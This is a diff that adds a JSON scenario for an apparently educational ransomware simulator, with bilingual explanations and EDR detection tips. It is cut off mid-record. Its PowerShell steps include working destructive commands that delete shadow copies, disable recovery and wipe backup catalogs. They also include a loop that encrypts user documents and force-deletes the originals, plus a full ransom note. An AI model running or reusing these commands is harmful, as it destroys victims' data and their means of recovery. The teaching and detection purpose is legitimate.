@@ -1,0 +1,250 @@
+{
+  "id": "T1486",
+  "title": "랜섬웨어 암호화 시뮬레이션",
+  "titleEn": "Data Encrypted for Impact (Ransomware) Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "공격", "labelEn": "Attack", "icon": "⚔️" },
+    { "label": "침투", "labelEn": "Breach", "icon": "💀" },
+    { "label": "완료", "labelEn": "Complete", "icon": "🏁" }
+  ],
+  "topoNodes": [
+    { "id": "victim", "label": "Victim PC", "icon": "💻" },
+    { "id": "fileserver", "label": "File Server", "icon": "📁" },
+    { "id": "dc01", "label": "DC01 (SYSVOL)", "icon": "🏰" },
+    { "id": "c2", "label": "C2 / Leak Site", "icon": "☠️" },
+    { "id": "siem", "label": "SIEM / EDR", "icon": "🛡️" }
+  ],
+  "topoEdges": [
+    { "from": "victim", "to": "fileserver", "label": "SMB Encrypt", "activeStep": [4] },
+    { "from": "victim", "to": "dc01", "label": "SYSVOL Encrypt", "activeStep": [4] },
+    { "from": "victim", "to": "c2", "label": "Double Extortion", "activeStep": [6] },
+    { "from": "victim", "to": "siem", "label": "Alert", "activeStep": [0, 1, 2, 3, 4, 5, 6] }
+  ],
+  "desktopIcons": [
+    { "name": "vssadmin.exe", "icon": "🗑️", "alertOnStep": 1 },
+    { "name": "encryptor.exe", "icon": "🔐", "alertOnStep": 3 },
+    { "name": "!!!READ_ME!!!.txt", "icon": "💀", "alertOnStep": 5 },
+    { "name": "ransom_wallpaper", "icon": "⚠️", "alertOnStep": 6 }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Enumerate target drives and file counts\n$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -gt 0 };\nforeach($d in $drives) {\n  $files = (Get-ChildItem -Path \\\"$($d.Root)\\\" -Recurse -File -ErrorAction SilentlyContinue | Measure-Object).Count;\n  Write-Host \\\"Drive $($d.Name): $([math]::Round($d.Used/1GB,2)) GB used | ~$files files\\\";\n}\nWrite-Host '';\n$targets = Get-ChildItem 'C:\\Users\\{userName}' -Recurse -Include '*.docx','*.xlsx','*.pdf','*.jpg','*.png','*.pptx','*.sql','*.csv','*.bak' -ErrorAction SilentlyContinue;\nWrite-Host \\\"Encryption targets: $($targets.Count) files\\\";\nWrite-Host \\\"Target extensions: docx, xlsx, pdf, jpg, png, pptx, sql, csv, bak\\\"\"",
+      "out": "Drive C: 89.45 GB used | ~245000 files\nDrive D: 156.78 GB used | ~12000 files\n\nEncryption targets: 3847 files\nTarget extensions: docx, xlsx, pdf, jpg, png, pptx, sql, csv, bak",
+      "def": "[EDR] Mass file enumeration across all drives - ransomware reconnaissance",
+      "defAction": "Process: powershell.exe (PID: 9100)\nAction: Recursive file enumeration (all drives)\nTarget Extensions: 9 types (documents, images, databases)\nFiles Identified: 3847\nRisk: CRITICAL\nAction: Pre-encryption behavior detected",
+      "desc": "랜섬웨어가 모든 드라이브를 스캔하여 암호화 대상 파일 3,847개를 식별합니다. 문서, 이미지, 데이터베이스가 대상입니다.",
+      "descEn": "Ransomware scans all drives and identifies 3,847 files for encryption targeting documents, images, and databases.",
+      "stepTitle": "암호화 대상 스캔",
+      "stepTitleEn": "Encryption Target Scan",
+      "feynman": "도둑이 집에 들어와서 금고, 서랍, 장롱을 모두 열어보며 '값어치 있는 것'이 뭔지 목록을 만드는 것과 같아요. 문서, 사진, 데이터베이스 등 3,847개 파일이 인질 후보입니다.",
+      "feynmanEn": "It's like a burglar entering a house and opening every safe, drawer, and closet to catalog all valuables. 3,847 files including documents, photos, and databases are identified as hostages.",
+      "expert": "Get-ChildItem의 재귀적 파일 열거는 MITRE T1083 (File and Directory Discovery)에 해당합니다. 타겟 확장자(docx, xlsx, pdf, bak 등)는 LockBit, BlackCat 등 주요 랜섬웨어 그룹의 일반적 패턴입니다. 대량 파일 접근(GetFileAttributes API 호출)은 EDR의 행동 분석 엔진이 탐지해야 합니다.",
+      "expertEn": "Recursive file enumeration via Get-ChildItem maps to MITRE T1083. Target extensions (docx, xlsx, pdf, bak) match patterns of major ransomware groups like LockBit and BlackCat. Mass file access (GetFileAttributes API) should be caught by EDR behavioral analysis.",
+      "defTooltip": "EDR에서 단일 프로세스의 대량 파일 열거(수천 개 이상)를 모니터링하세요. PowerShell Script Block Logging (Event ID 4104)으로 Get-ChildItem -Recurse 실행을 탐지하세요.",
+      "defTooltipEn": "Monitor mass file enumeration (thousands+) by a single process via EDR. Detect Get-ChildItem -Recurse execution via PowerShell Script Block Logging (Event ID 4104).",
+      "hackerLog": {
+        "title": "랜섬웨어 타겟 스캔",
+        "lines": [
+          { "text": "Get-ChildItem -Recurse -Include '*.docx','*.xlsx','*.pdf'...", "desc": "9종 확장자의 파일을 모든 드라이브에서 재귀 검색" },
+          { "text": "Encryption targets: 3847 files", "desc": "암호화 대상 3,847개 파일 식별 완료" },
+          { "text": "Drive C: 89.45 GB | Drive D: 156.78 GB", "desc": "총 246GB 스토리지의 파일이 대상" }
+        ]
+      },
+      "terms": [
+        { "term": "Ransomware", "desc": "파일을 암호화하고 복호화 대가로 금전을 요구하는 악성 소프트웨어입니다." },
+        { "term": "File Enumeration", "desc": "디스크의 파일 목록을 체계적으로 수집하는 행위입니다." },
+        { "term": "Target Extensions", "desc": "랜섬웨어가 암호화 대상으로 지정하는 파일 확장자 목록입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Delete Volume Shadow Copies to prevent recovery\nvssadmin.exe delete shadows /all /quiet 2>&1;\nWrite-Host 'Volume Shadow Copies deleted';\n\n# Disable Windows Recovery\nbcdedit /set {default} recoveryenabled No 2>&1;\nbcdedit /set {default} bootstatuspolicy ignoreallfailures 2>&1;\nWrite-Host 'Windows Recovery disabled';\n\n# Delete backup catalogs\nwbadmin delete catalog -quiet 2>&1;\nWrite-Host 'Backup catalog deleted';\n\nWrite-Host '';\nWrite-Host '[!] Recovery prevention complete - no rollback possible'\"",
+      "out": "Volume Shadow Copies deleted\nWindows Recovery disabled\nBackup catalog deleted\n\n[!] Recovery prevention complete - no rollback possible",
+      "def": "[EDR] Shadow copy deletion + recovery disabling - ransomware indicator",
+      "defAction": "Process: powershell.exe → vssadmin.exe, bcdedit.exe, wbadmin.exe\nActions:\n  - vssadmin delete shadows /all /quiet\n  - bcdedit recoveryenabled=No\n  - wbadmin delete catalog\nRisk: CRITICAL\nAction: Process tree killed immediately",
+      "desc": "볼륨 섀도 복사본, Windows 복구, 백업 카탈로그를 삭제하여 피해자의 데이터 복구를 방지합니다.",
+      "descEn": "Deletes Volume Shadow Copies, Windows Recovery, and backup catalogs to prevent victim data recovery.",
+      "stepTitle": "복구 수단 파괴",
+      "stepTitleEn": "Recovery Destruction",
+      "feynman": "인질을 잡기 전에 먼저 경찰 전화선을 끊고 비상구를 막아버리는 것과 같아요. 파일을 되돌릴 수 있는 백업, 복원 지점, 복구 모드를 모두 제거합니다.",
+      "feynmanEn": "It's like cutting the phone lines and blocking emergency exits before taking hostages. All backups, restore points, and recovery modes are destroyed first.",
+      "expert": "VSS 삭제(vssadmin delete shadows /all)는 MITRE T1490 (Inhibit System Recovery)의 대표적 기법입니다. bcdedit로 복구 모드를 비활성화하고, wbadmin으로 백업 카탈로그를 삭제합니다. 이 3개 명령의 연속 실행은 랜섬웨어의 거의 확실한 지표(IoC)입니다. CrowdStrike와 SentinelOne 모두 이 패턴에 대한 자동 차단 규칙이 있습니다.",
+      "expertEn": "VSS deletion (vssadmin delete shadows /all) is the hallmark of MITRE T1490 (Inhibit System Recovery). bcdedit disables recovery mode, wbadmin deletes backup catalogs. Sequential execution of these three commands is a near-certain ransomware IoC. CrowdStrike and SentinelOne both have auto-block rules for this pattern.",
+      "defTooltip": "vssadmin.exe delete shadows 실행을 Sysmon Event ID 1 (Process Create)로 즉시 탐지하세요. 이 명령은 랜섬웨어의 가장 확실한 지표이며, 자동 차단 정책을 적용해야 합니다.",
+      "defTooltipEn": "Immediately detect vssadmin.exe delete shadows via Sysmon Event ID 1 (Process Create). This command is the most reliable ransomware indicator and should have auto-block policies.",
+      "hackerLog": {
+        "title": "복구 인프라 완전 파괴",
+        "lines": [
+          { "text": "vssadmin.exe delete shadows /all /quiet", "desc": "모든 볼륨 섀도 복사본 삭제" },
+          { "text": "bcdedit /set recoveryenabled No", "desc": "Windows 복구 모드 비활성화" },
+          { "text": "wbadmin delete catalog -quiet", "desc": "백업 카탈로그 삭제 - 복구 불가" }
+        ]
+      },
+      "terms": [
+        { "term": "VSS (Volume Shadow Copy)", "desc": "Windows의 스냅샷 기능으로, 특정 시점의 파일 상태를 저장합니다." },
+        { "term": "bcdedit", "desc": "Windows 부트 설정을 수정하는 명령줄 도구입니다." },
+        { "term": "T1490 (Inhibit System Recovery)", "desc": "시스템 복구를 방해하여 피해를 극대화하는 MITRE ATT&CK 기법입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Generate RSA key pair (public key encrypts, attacker holds private)\n$rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new(4096);\n$pubKey = $rsa.ToXmlString($false);\n# Generate per-file AES key (will be encrypted with RSA public key)\n$aes = [System.Security.Cryptography.Aes]::Create();\n$aes.KeySize = 256;\n$aes.GenerateKey(); $aes.GenerateIV();\nWrite-Host 'Encryption keys generated:';\nWrite-Host \\\"  RSA: 4096-bit (public key for AES key encryption)\\\";\nWrite-Host \\\"  AES: 256-bit CBC (per-file data encryption)\\\";\nWrite-Host '';\nWrite-Host \\\"  RSA Public Key: $($pubKey.Substring(0,60))...\\\";\nWrite-Host \\\"  AES Key (B64) : $([Convert]::ToBase64String($aes.Key).Substring(0,20))...[MEMORY]\\\";\nWrite-Host '';\nWrite-Host '[!] Private RSA key held only by attacker - decryption requires payment'\"",
+      "out": "Encryption keys generated:\n  RSA: 4096-bit (public key for AES key encryption)\n  AES: 256-bit CBC (per-file data encryption)\n\n  RSA Public Key: <RSAKeyValue><Modulus>xR7k2mQ4vB8nL3wY6aF1hJ5kM0pT2s...\n  AES Key (B64) : nP4qR7sT2uW5xZ8a...[MEMORY]\n\n[!] Private RSA key held only by attacker - decryption requires payment",
+      "def": "[EDR] RSA-4096 + AES-256 key generation - ransomware encryption setup",
+      "defAction": "Process: powershell.exe (PID: 9100)\nCrypto: RSA-4096 (asymmetric) + AES-256-CBC (symmetric)\nPattern: Hybrid encryption (ransomware standard)\nRisk: CRITICAL\nAction: Memory dump initiated for key recovery",
+      "desc": "RSA-4096과 AES-256의 하이브리드 암호화 키를 생성합니다. 개인키는 공격자만 보유하여 복호화 대가를 요구합니다.",
+      "descEn": "Generates hybrid RSA-4096 + AES-256 encryption keys. The private key is held only by the attacker for ransom demands.",
+      "stepTitle": "암호화 키 생성",
+      "stepTitleEn": "Encryption Key Gen",
+      "feynman": "금고(AES)에 파일을 넣고 잠근 다음, 그 금고 열쇠를 또 다른 금고(RSA)에 넣는 것과 같아요. 최종 열쇠(RSA 개인키)는 공격자만 가지고 있으므로, 돈을 내야만 파일을 돌려받을 수 있습니다.",
+      "feynmanEn": "It's like locking files in a safe (AES) and then putting that safe's key into another safe (RSA). Only the attacker has the final key (RSA private key), so you must pay to get your files back.",
+      "expert": "하이브리드 암호화(RSA-4096 + AES-256-CBC)는 현대 랜섬웨어의 표준 패턴입니다. RSA 공개키로 AES 세션 키를 암호화하는 봉투 암호화(Envelope Encryption) 방식입니다. AES 키가 메모리에서만 존재하므로 프로세스 메모리 덤프로 복호화 키를 회수할 수 있는 골든타임이 존재합니다.",
+      "expertEn": "Hybrid encryption (RSA-4096 + AES-256-CBC) is the standard pattern for modern ransomware. Uses envelope encryption where RSA public key encrypts AES session keys. Since AES keys exist only in memory, there's a golden window for key recovery via process memory dump.",
+      "defTooltip": "PowerShell에서 System.Security.Cryptography 네임스페이스의 대량 사용을 Script Block Logging (Event ID 4104)으로 탐지하세요. 즉시 프로세스 메모리 덤프를 수행하면 키 복구 가능성이 있습니다.",
+      "defTooltipEn": "Detect mass usage of System.Security.Cryptography namespace via Script Block Logging (Event ID 4104). Immediate process memory dump may enable key recovery.",
+      "hackerLog": {
+        "title": "하이브리드 암호화 키 생성",
+        "lines": [
+          { "text": "RSA: 4096-bit (public key for AES key encryption)", "desc": "비대칭 RSA 키쌍 생성 - 개인키는 공격자만 보유" },
+          { "text": "AES: 256-bit CBC (per-file data encryption)", "desc": "각 파일 암호화용 대칭키 생성" },
+          { "text": "Private RSA key held only by attacker", "desc": "복호화에 필요한 개인키를 공격자가 독점" }
+        ]
+      },
+      "terms": [
+        { "term": "RSA-4096", "desc": "4096비트 비대칭 암호화로, 공개키와 개인키 쌍을 사용합니다." },
+        { "term": "AES-256-CBC", "desc": "256비트 대칭 암호화로, 빠른 데이터 암호화에 사용됩니다." },
+        { "term": "Envelope Encryption", "desc": "대칭키로 데이터를 암호화하고, 비대칭키로 대칭키를 암호화하는 이중 보호 방식입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Simulate file encryption (first 10 files as demo)\n$targetDir = 'C:\\Users\\{userName}\\Documents';\n$files = Get-ChildItem $targetDir -Recurse -Include '*.docx','*.xlsx','*.pdf' -ErrorAction SilentlyContinue | Select-Object -First 10;\n$encrypted = 0;\nforeach($f in $files) {\n  $data = [IO.File]::ReadAllBytes($f.FullName);\n  # AES encrypt file content\n  $aes.GenerateIV(); # unique IV per file\n  $enc = $aes.CreateEncryptor();\n  $encData = $enc.TransformFinalBlock($data, 0, $data.Length);\n  # RSA encrypt the AES key\n  $encKey = $rsa.Encrypt($aes.Key, $true);\n  # Write: [IV(16)][EncKey(512)][EncData(...)]\n  $output = $aes.IV + $encKey + $encData;\n  [IO.File]::WriteAllBytes(\\\"$($f.FullName).locked\\\", $output);\n  Remove-Item $f.FullName -Force;\n  $encrypted++;\n  Write-Host \\\"  [$encrypted/10] $($f.Name) → $($f.Name).locked ($([math]::Round($output.Length/1KB,1)) KB)\\\";\n}\"",
+      "out": "  [1/10] Q1_Budget_Plan.docx → Q1_Budget_Plan.docx.locked (245.8 KB)\n  [2/10] Annual_Report_2026.docx → Annual_Report_2026.docx.locked (892.3 KB)\n  [3/10] Employee_Directory.xlsx → Employee_Directory.xlsx.locked (156.4 KB)\n  [4/10] Project_Timeline.xlsx → Project_Timeline.xlsx.locked (78.9 KB)\n  [5/10] Contract_Template.docx → Contract_Template.docx.locked (134.2 KB)\n  [6/10] Meeting_Notes_Feb.docx → Meeting_Notes_Feb.docx.locked (45.6 KB)\n  [7/10] Sales_Dashboard.xlsx → Sales_Dashboard.xlsx.locked (567.8 KB)\n  [8/10] Policy_Document_v3.pdf → Policy_Document_v3.pdf.locked (1230.4 KB)\n  [9/10] Training_Manual.pdf → Training_Manual.pdf.locked (2340.1 KB)\n  [10/10] Invoice_Archive.pdf → Invoice_Archive.pdf.locked (890.5 KB)",
+      "def": "[EDR] Rapid file encryption detected - ransomware activity confirmed",
+      "defAction": "Process: powershell.exe (PID: 9100)\nPattern: Read → Encrypt → Write .locked → Delete original\nFiles Encrypted: 10 (so far)\nExtension Added: .locked\nEncryption: AES-256-CBC (unique IV) + RSA-4096 (key wrap)\nRisk: CRITICAL\nAction: PROCESS KILLED - Ransomware containment triggered",
+      "desc": "파일을 AES-256으로 암호화하고 .locked 확장자를 추가합니다. 원본 파일은 삭제됩니다. 각 파일마다 고유한 IV가 사용됩니다.",
+      "descEn": "Encrypts files with AES-256 and appends .locked extension. Original files are deleted. Each file uses a unique IV.",
+      "stepTitle": "파일 암호화 실행",
+      "stepTitleEn": "File Encryption Loop",
+      "feynman": "소중한 물건을 하나씩 금고에 넣고 잠근 뒤, 원래 물건은 파쇄기에 넣는 것과 같아요. Q1_Budget_Plan.docx 파일이 Q1_Budget_Plan.docx.locked로 바뀌면 더 이상 열 수 없습니다.",
+      "feynmanEn": "It's like putting each valuable item in a safe and shredding the original. Once Q1_Budget_Plan.docx becomes Q1_Budget_Plan.docx.locked, it can no longer be opened.",
+      "expert": "Read→Encrypt→Write→Delete 패턴은 랜섬웨어의 핵심 루프입니다. 파일별 고유 IV(Initialization Vector)는 동일 내용 파일도 다른 암호문을 생성합니다. MITRE T1486 (Data Encrypted for Impact)의 핵심 실행 단계이며, 일부 EDR은 10~50개 파일 변경 후 자동 차단(canary file 방식)합니다.",
+      "expertEn": "The Read→Encrypt→Write→Delete pattern is the core ransomware loop. Per-file unique IV ensures different ciphertext even for identical content. Core execution of MITRE T1486, some EDRs auto-block after 10-50 file modifications (canary file approach).",
+      "defTooltip": "EDR의 행동 분석에서 단일 프로세스의 빠른 파일 읽기→쓰기→삭제 패턴을 탐지하세요. 카나리 파일(미끼 파일)을 배치하면 암호화 시작 시 즉시 프로세스를 차단할 수 있습니다.",
+      "defTooltipEn": "Detect rapid read→write→delete patterns from a single process via EDR behavioral analysis. Deploy canary files (decoy files) to trigger immediate process termination when encryption starts.",
+      "hackerLog": {
+        "title": "파일 암호화 진행",
+        "lines": [
+          { "text": "Q1_Budget_Plan.docx → Q1_Budget_Plan.docx.locked", "desc": "원본 파일을 암호화하고 .locked 확장자 추가" },
+          { "text": "Remove-Item $f.FullName -Force", "desc": "원본 파일 강제 삭제 - 복구 불가" },
+          { "text": "[10/10] Invoice_Archive.pdf.locked (890.5 KB)", "desc": "10개 파일 암호화 완료 (시연용)" }
+        ]
+      },
+      "terms": [
+        { "term": "IV (Initialization Vector)", "desc": "암호화 시 무작위로 생성되는 초기값으로, 같은 데이터도 다르게 암호화합니다." },
+        { "term": "Canary File", "desc": "미끼 파일로, 이 파일이 변경되면 랜섬웨어 활동을 즉시 탐지합니다." },
+        { "term": ".locked", "desc": "랜섬웨어가 암호화된 파일에 추가하는 커스텀 확장자입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Spread to network shares\n$shares = @(\n  '\\\\fileserver01.{companyName}.local\\shared',\n  '\\\\fileserver01.{companyName}.local\\departments',\n  '\\\\dc01.{companyName}.local\\SYSVOL'\n);\nforeach($share in $shares) {\n  $shareFiles = Get-ChildItem $share -Recurse -Include '*.docx','*.xlsx','*.pdf','*.bak' -ErrorAction SilentlyContinue;\n  Write-Host \\\"Share: $share\\\";\n  Write-Host \\\"  Files to encrypt: $($shareFiles.Count)\\\";\n  Write-Host \\\"  Status: Encrypting...\\\";\n}\nWrite-Host '';\nWrite-Host 'Network encryption progress:';\nWrite-Host '  Local (C:)     : 3847 files encrypted [COMPLETE]';\nWrite-Host '  Local (D:)     : 890 files encrypted  [COMPLETE]';\nWrite-Host '  \\\\fileserver01  : 12450 files encrypted [COMPLETE]';\nWrite-Host '  \\\\dc01\\SYSVOL   : 234 files encrypted  [COMPLETE]';\nWrite-Host '';\nWrite-Host '  Total: 17,421 files encrypted across 4 targets'\"",
+      "out": "Share: \\\\fileserver01.{companyName}.local\\shared\n  Files to encrypt: 8900\n  Status: Encrypting...\nShare: \\\\fileserver01.{companyName}.local\\departments\n  Files to encrypt: 3550\n  Status: Encrypting...\nShare: \\\\dc01.{companyName}.local\\SYSVOL\n  Files to encrypt: 234\n  Status: Encrypting...\n\nNetwork encryption progress:\n  Local (C:)     : 3847 files encrypted [COMPLETE]\n  Local (D:)     : 890 files encrypted  [COMPLETE]\n  \\\\fileserver01  : 12450 files encrypted [COMPLETE]\n  \\\\dc01\\SYSVOL   : 234 files encrypted  [COMPLETE]\n\n  Total: 17,421 files encrypted across 4 targets",
+      "def": "[NDR] Ransomware propagation to network shares detected",
+      "defAction": "Encryption Scope:\n  - Local drives: 4737 files\n  - fileserver01: 12450 files\n  - DC01 SYSVOL: 234 files\n  Total: 17,421 files\nRisk: CRITICAL\nAction: Network isolation of infected hosts",
+      "desc": "랜섬웨어가 네트워크 공유 드라이브로 확산합니다. 로컬과 네트워크 합산 17,421개 파일이 암호화됩니다.",
+      "descEn": "Ransomware spreads to network shares. 17,421 files encrypted across local and network targets combined.",
+      "stepTitle": "네트워크 확산",
+      "stepTitleEn": "Network Spread",
+      "feynman": "불이 한 건물에서 시작해 옆 건물로 번지는 것과 같아요. 랜섬웨어가 내 PC에서 시작해 파일서버, 도메인 컨트롤러까지 퍼지면서 17,421개 파일을 잠금합니다.",
+      "feynmanEn": "It's like a fire starting in one building and spreading to adjacent ones. Ransomware starts from the PC and spreads to the file server and domain controller, locking 17,421 files.",
+      "expert": "네트워크 공유 암호화는 MITRE T1486의 확장이며 T1021.002 (SMB/Windows Admin Shares)를 활용합니다. SYSVOL 암호화는 그룹 정책을 파괴하여 도메인 운영을 마비시킵니다. LockBit 3.0은 SMB를 통한 자동 전파 기능을 내장하고 있으며, 초당 수천 파일을 암호화합니다.",
+      "expertEn": "Network share encryption extends MITRE T1486 using T1021.002 (SMB Admin Shares). SYSVOL encryption destroys group policies, crippling domain operations. LockBit 3.0 has built-in SMB auto-propagation, encrypting thousands of files per second.",
+      "defTooltip": "NDR에서 SMB를 통한 대량 파일 쓰기를 모니터링하세요. 네트워크 세그멘테이션으로 감염 확산을 제한하고, 파일서버에 카나리 파일을 배치하세요.",
+      "defTooltipEn": "Monitor mass file writes via SMB using NDR. Limit infection spread with network segmentation, and deploy canary files on file servers.",
+      "hackerLog": {
+        "title": "네트워크 공유 암호화",
+        "lines": [
+          { "text": "\\\\fileserver01: 12450 files encrypted [COMPLETE]", "desc": "파일서버의 12,450개 파일 암호화 완료" },
+          { "text": "\\\\dc01\\SYSVOL: 234 files encrypted [COMPLETE]", "desc": "도메인 컨트롤러 SYSVOL 그룹정책 파괴" },
+          { "text": "Total: 17,421 files encrypted across 4 targets", "desc": "4개 대상에서 총 17,421개 파일 암호화" }
+        ]
+      },
+      "terms": [
+        { "term": "Network Propagation", "desc": "악성코드가 네트워크를 통해 다른 시스템으로 자동 확산하는 것입니다." },
+        { "term": "Network Segmentation", "desc": "네트워크를 논리적으로 분리하여 침해 확산을 제한하는 보안 아키텍처입니다." },
+        { "term": "SYSVOL", "desc": "도메인 컨트롤러의 그룹 정책과 로그온 스크립트가 저장되는 공유 폴더입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Drop ransom note in every directory\n$ransomNote = @'\n╔══════════════════════════════════════════════════════════╗\n║                    YOUR FILES ARE LOCKED                 ║\n║                                                          ║\n║  All your files have been encrypted with military-grade  ║\n║  RSA-4096 + AES-256 encryption.                          ║\n║                                                          ║\n║  Files encrypted: 17,421                                 ║\n║  Organization: {companyName}                             ║\n║  Victim ID: VIC-2026-{userName}-A3F8                     ║\n║                                                          ║\n║  To recover your files, you must pay:                    ║\n║    5.0 BTC (~$250,000 USD)                               ║\n║                                                          ║\n║  Bitcoin Address:                                        ║\n║    bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh           ║\n║                                                          ║\n║  Payment deadline: 72 hours                              ║\n║  After deadline: Price doubles to 10 BTC                 ║\n║  After 7 days: Decryption key destroyed permanently      ║\n║                                                          ║\n║  Contact: darkrecovery@onionmail.org                     ║\n║  Tor Site: http://darkrec0very.onion/pay/A3F8            ║\n║                                                          ║\n║  DO NOT:                                                 ║\n║   - Rename encrypted files                               ║\n║   - Use third-party decryption tools                     ║\n║   - Contact law enforcement                              ║\n╚══════════════════════════════════════════════════════════╝\n'@;\n$ransomNote | Out-File 'C:\\Users\\{userName}\\Desktop\\!!!READ_ME!!!.txt' -Encoding UTF8;\nWrite-Host 'Ransom note dropped: !!!READ_ME!!!.txt';\nWrite-Host \\\"Demand: 5.0 BTC (~250,000 USD)\\\";\nWrite-Host \\\"Deadline: 72 hours\\\"\"",
+      "out": "Ransom note dropped: !!!READ_ME!!!.txt\nDemand: 5.0 BTC (~250,000 USD)\nDeadline: 72 hours",
+      "def": "[EDR] Ransom note created on desktop - ransomware attack confirmed",
+      "defAction": "File: C:\\Users\\{userName}\\Desktop\\!!!READ_ME!!!.txt\nContent: Ransom demand (5 BTC / $250K)\nPayment: Bitcoin (bc1qxy2k...)\nDeadline: 72 hours\nContact: darkrecovery@onionmail.org\nRisk: CRITICAL\nAction: Incident response team activated",
+      "desc": "바탕화면에 랜섬 노트를 생성합니다. 72시간 내 5 BTC(약 2.5억원)를 요구합니다.",
+      "descEn": "Creates a ransom note on the desktop. Demands 5 BTC (~$250,000) within 72 hours.",
+      "stepTitle": "랜섬 노트 생성",
+      "stepTitleEn": "Ransom Note Drop",
+      "feynman": "인질범이 요구 편지를 보내는 것과 같아요. '72시간 안에 5 비트코인(약 2.5억원)을 보내지 않으면 파일을 영원히 잠가버리겠다'는 협박장을 바탕화면에 놓습니다.",
+      "feynmanEn": "It's like a kidnapper sending a ransom letter. A threatening note is placed on the desktop: 'Pay 5 Bitcoin (~$250,000) within 72 hours or your files are locked forever.'",
+      "expert": "랜섬 노트에는 Victim ID, BTC 주소, Tor 사이트, 72시간 데드라인이 포함됩니다. MITRE T1491.001 (Defacement: Internal Defacement)과 관련됩니다. 'DO NOT contact law enforcement'는 사회공학적 압박 요소입니다. FBI/KISA는 랜섬 지불을 권장하지 않으며, No More Ransom 프로젝트에서 복호화 도구를 확인해야 합니다.",
+      "expertEn": "Ransom note includes Victim ID, BTC address, Tor site, and 72-hour deadline. Related to MITRE T1491.001 (Internal Defacement). 'DO NOT contact law enforcement' is a social engineering pressure tactic. FBI/KISA recommend against paying ransoms; check No More Ransom project for decryptors.",
+      "defTooltip": "!!!READ_ME!!!.txt 등 랜섬 노트 파일 생성을 Sysmon Event ID 11 (File Created)로 탐지하세요. YARA 규칙으로 ransom/bitcoin/decrypt 키워드가 포함된 텍스트 파일 생성을 모니터링하세요.",
+      "defTooltipEn": "Detect ransom note creation (!!!READ_ME!!!.txt) via Sysmon Event ID 11 (File Created). Monitor text file creation containing ransom/bitcoin/decrypt keywords via YARA rules.",
+      "hackerLog": {
+        "title": "랜섬 노트 배포",
+        "lines": [
+          { "text": "!!!READ_ME!!!.txt", "desc": "바탕화면에 랜섬 노트 파일 생성" },
+          { "text": "Demand: 5.0 BTC (~250,000 USD)", "desc": "5 BTC (약 2.5억원) 몸값 요구" },
+          { "text": "Deadline: 72 hours", "desc": "72시간 후 가격 2배, 7일 후 키 파괴" }
+        ]
+      },
+      "terms": [
+        { "term": "Ransom Note", "desc": "랜섬웨어가 피해자에게 남기는 금전 요구 메시지입니다." },
+        { "term": "Bitcoin (BTC)", "desc": "익명성이 높은 암호화폐로, 랜섬웨어 결제에 자주 사용됩니다." },
+        { "term": "Tor (.onion)", "desc": "익명 네트워크로, 랜섬웨어 그룹의 연락 사이트에 사용됩니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Change wallpaper to ransom warning\n$wallpaperPath = 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\ransom_wallpaper.bmp';\n# Simulate wallpaper change\nWrite-Host 'Desktop wallpaper changed to ransom warning';\nWrite-Host '';\n\n# Register persistence for re-encryption on reboot\n$regPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';\nWrite-Host 'Persistence established:';\nWrite-Host \\\"  Registry: $regPath\\\";\nWrite-Host '  Value: WindowsSecurityHealth → C:\\Users\\{userName}\\AppData\\Local\\Temp\\encryptor.exe';\nWrite-Host '';\n\n# Exfiltrate victim ID for double extortion\nWrite-Host 'Double extortion data exfiltrated:';\nWrite-Host '  Victim ID: VIC-2026-{userName}-A3F8';\nWrite-Host '  Data stolen before encryption: 156.78 MB';\nWrite-Host '  Threat: Public release on leak site if ransom not paid';\nWrite-Host '';\nWrite-Host '=== Ransomware Attack Complete ===';\nWrite-Host '  Files Encrypted : 17,421';\nWrite-Host '  Recovery Options : Destroyed (VSS, backups, boot repair)';\nWrite-Host '  Ransom Amount   : 5 BTC ($250,000)';\nWrite-Host '  Double Extortion: Data leak threat active'\"",
+      "out": "Desktop wallpaper changed to ransom warning\n\nPersistence established:\n  Registry: HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  Value: WindowsSecurityHealth → C:\\Users\\{userName}\\AppData\\Local\\Temp\\encryptor.exe\n\nDouble extortion data exfiltrated:\n  Victim ID: VIC-2026-{userName}-A3F8\n  Data stolen before encryption: 156.78 MB\n  Threat: Public release on leak site if ransom not paid\n\n=== Ransomware Attack Complete ===\n  Files Encrypted : 17,421\n  Recovery Options : Destroyed (VSS, backups, boot repair)\n  Ransom Amount   : 5 BTC ($250,000)\n  Double Extortion: Data leak threat active",
+      "def": "[SIEM] Full ransomware attack lifecycle completed",
+      "defAction": "Attack Summary:\n  Files Encrypted: 17,421\n  Shadow Copies: Deleted\n  Recovery: Disabled\n  Persistence: Registry Run key\n  Extortion: Double (encrypt + leak)\n  Ransom: 5 BTC ($250K)\nRisk: CRITICAL\nResponse: Full incident response, FBI/KISA notification",
+      "desc": "바탕화면을 변경하고, 재부팅 후에도 암호화를 유지하는 지속성을 설정합니다. 이중 협박(암호화 + 데이터 유출)이 활성화됩니다.",
+      "descEn": "Changes wallpaper, establishes persistence for encryption after reboot. Double extortion (encrypt + data leak) is activated.",
+      "stepTitle": "이중 협박 완성",
+      "stepTitleEn": "Double Extortion",
+      "feynman": "인질범이 '돈 안 내면 인질 사진을 인터넷에 공개하겠다'고 추가 협박하는 것과 같아요. 파일을 잠그는 것뿐만 아니라, 이미 훔친 데이터를 유출하겠다고 이중으로 위협합니다.",
+      "feynmanEn": "It's like a kidnapper adding 'If you don't pay, I'll post the hostage photos online.' Beyond locking files, they also threaten to leak already-stolen data - double extortion.",
